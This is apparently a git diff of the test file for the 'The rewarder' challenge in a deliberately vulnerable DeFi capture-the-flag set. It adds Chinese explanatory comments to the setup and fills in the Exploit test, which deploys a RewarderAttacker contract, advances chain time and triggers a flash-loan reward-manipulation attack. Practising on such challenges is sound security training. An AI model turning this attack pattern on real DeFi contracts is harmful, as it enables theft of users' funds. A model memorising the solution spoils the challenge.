@@ -21,9 +21,12 @@ describe('[Challenge] The rewarder', function () {
         const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
 
         this.liquidityToken = await DamnValuableTokenFactory.deploy();
+
+
         this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);
 
         // Set initial token balance of the pool offering flash loans
+        //充值到池子中
         await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);
 
         this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
@@ -33,20 +36,27 @@ describe('[Challenge] The rewarder', function () {
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (let i = 0; i < users.length; i++) {
             const amount = ethers.utils.parseEther('100');
+            // 打到本人账上
             await this.liquidityToken.transfer(users[i].address, amount);
+            // 授权给pool 
             await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
+            //然后自己的账上的钱 划到池子中
             await this.rewarderPool.connect(users[i]).deposit(amount);
+
             expect(
                 await this.accountingToken.balanceOf(users[i].address)
             ).to.be.eq(amount);
+
         }
         expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
         expect(await this.rewardToken.totalSupply()).to.be.eq('0');
 
         // Advance time 5 days so that depositors can get rewards
+        // 为了使存款得到奖励 增加 5天
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
         
         // Each depositor gets 25 reward tokens
+
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             expect(
@@ -66,6 +76,12 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+      const RewarderAttckerFactory = await ethers.getContractFactory("RewarderAttacker",attacker);
+      this.rewarderAttcker = await RewarderAttckerFactory.deploy(this.rewarderPool.address,this.flashLoanPool.address,
+        this.liquidityToken.address);
+       await ethers.provider.send("evm_increaseTime",[5.1*24*60*60]);
+       await this.rewarderAttcker.attack(TOKENS_IN_LENDER_POOL); 
+
     });
 
     after(async function () {
